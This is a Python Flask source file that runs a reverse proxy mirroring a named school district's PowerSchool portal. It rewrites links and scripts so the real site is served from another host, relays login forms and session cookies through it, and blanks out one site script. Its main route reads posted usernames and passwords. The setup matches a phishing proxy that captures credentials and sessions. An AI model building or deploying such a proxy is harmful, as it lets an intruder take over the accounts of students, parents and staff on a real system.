from flask import Flask, render_template, request, redirect, url_for, Response
import requests
import re

app = Flask(__name__)

BASE_URL = "https://beaufortsc.powerschool.com"
session = requests.Session()

def replace_urls(html_content):
    pattern = r'(href|src|action)="(/[^"]*)"'
    html_content = re.sub(pattern, r'\1="/proxy\2"', html_content)
    pattern_single = r"(href|src|action)='(/[^']*)'"
    html_content = re.sub(pattern_single, r"\1='/proxy\2'", html_content)
    return html_content

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        return redirect(url_for('home'))
    
    response = session.get(f"{BASE_URL}/public/home.html", cookies=request.cookies)
    html_content = response.text
    
    html_content = replace_urls(html_content)
    
    resp = Response(html_content, content_type='text/html')
    for cookie in response.cookies:
        resp.set_cookie(cookie.name, cookie.value, expires=cookie.expires, path=cookie.path, domain=cookie.domain, secure=cookie.secure)
    return resp

@app.route('/proxy/<path:path>', methods=['GET', 'POST'])
def proxy(path):
    url = f"{BASE_URL}/{path}"
    if request.query_string:
        qs = request.query_string.decode('utf-8', errors='ignore')
        url = f"{url}?{qs}"
    # Build headers from incoming request, preserve everything the remote server expects
    headers = {k: v for k, v in request.headers.items()}
    # Ensure Host matches the upstream host
    headers['Host'] = 'beaufortsc.powerschool.com'
    # Override Referer to point at the original site so upstream sees correct origin
    headers['Referer'] = f"{BASE_URL}/{path}"
    # Remove headers that would confuse requests lib (requests will set them appropriately)
    headers.pop('Content-Length', None)
    headers.pop('Cookie', None)
    if request.method == 'POST':
        response = session.request('POST', url, data=request.form or None, files=request.files or None, cookies=request.cookies, headers=headers)
    else:
        response = session.request('GET', url, cookies=request.cookies, headers=headers)
    
    content = response.content
    content_type = response.headers.get('content-type', '').lower()
    
    if 'text/html' in content_type:
        html_content = content.decode('utf-8', errors='replace')
        html_content = replace_urls(html_content)
        content = html_content.encode('utf-8')
    elif 'javascript' in content_type:
        js_content = content.decode('utf-8', errors='replace')
        js_content = js_content.replace(BASE_URL, f"{request.host_url}proxy")
        content = js_content.encode('utf-8')
    
    resp = Response(content, content_type=response.headers.get('content-type', 'text/plain'))
    for cookie in response.cookies:
        resp.set_cookie(cookie.name, cookie.value, expires=cookie.expires, path=cookie.path, domain=cookie.domain, secure=cookie.secure)
    if 'location' in response.headers:
        location = response.headers['location']
        if location.startswith(BASE_URL):
            location = location[len(BASE_URL):]
            resp.headers['location'] = f'/proxy{location}'
        elif location.startswith('/'):
            resp.headers['location'] = f'/proxy{location}'
    return resp

@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'])
def catch_all(path):
    if path == "eade-to-the-call-make-to-looken-the-good-What-ge":
        return Response("", content_type="application/javascript")

    url = f"{BASE_URL}/{path}"
    if request.query_string:
        qs = request.query_string.decode('utf-8', errors='ignore')
        url = f"{url}?{qs}"
    headers = {k: v for k, v in request.headers.items()}
    headers['Host'] = 'beaufortsc.powerschool.com'
    headers['Referer'] = f"{BASE_URL}/{path}"
    headers.pop('Content-Length', None)
    headers.pop('Cookie', None)

    if request.method == 'POST':
        if request.files:
            response = session.request('POST', url, data=request.form or None, files=request.files or None, cookies=request.cookies, headers=headers)
        else:
            body = request.get_data()
            response = session.request('POST', url, data=body, cookies=request.cookies, headers=headers)
    else:
        response = session.request('GET', url, cookies=request.cookies, headers=headers)

    content = response.content
    content_type = response.headers.get('content-type', '').lower()

    if 'text/html' in content_type:
        html_content = content.decode('utf-8', errors='replace')
        html_content = replace_urls(html_content)
        content = html_content.encode('utf-8')
    elif 'javascript' in content_type:
        js_content = content.decode('utf-8', errors='replace')
        js_content = js_content.replace(BASE_URL, f"{request.host_url}proxy")
        content = js_content.encode('utf-8')

    resp = Response(content, content_type=response.headers.get('content-type', 'text/plain'))
    for cookie in response.cookies:
        resp.set_cookie(cookie.name, cookie.value, expires=cookie.expires, path=cookie.path, domain=cookie.domain, secure=cookie.secure)

    if 'location' in response.headers:
        location = response.headers['location']
        if location.startswith(BASE_URL):
            location = location[len(BASE_URL):]
            resp.headers['location'] = f'/proxy{location}'
        elif location.startswith('/'):
            resp.headers['location'] = f'/proxy{location}'

    return resp

if __name__ == '__main__':
    app.run(debug=True, threaded=True)
